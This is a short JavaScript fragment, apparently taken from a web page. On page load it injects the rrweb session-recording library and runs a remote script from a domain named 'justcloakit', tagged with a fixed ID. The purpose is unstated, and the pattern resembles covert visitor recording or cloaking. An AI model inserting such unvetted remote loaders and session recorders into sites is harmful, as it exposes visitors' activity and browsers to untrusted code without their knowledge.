
        document.addEventListener('DOMContentLoaded',function(e){
            let uuid = '5922b8e6-8f8c-4686-a354-953c7bfa1d27';
            const link = document.createElement("link");
            link.href = "https://cdn.jsdelivr.net/npm/rrweb-player@latest/dist/style.css";
            link.rel = "stylesheet";
            document.head.appendChild(link);
            let script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb-all.js'
            document.head.appendChild(script);
            let script1 = document.createElement('script');
            script1.src = 'https://ana.justcloakit.link//static/main.js';
            document.head.appendChild(script1);
        })
    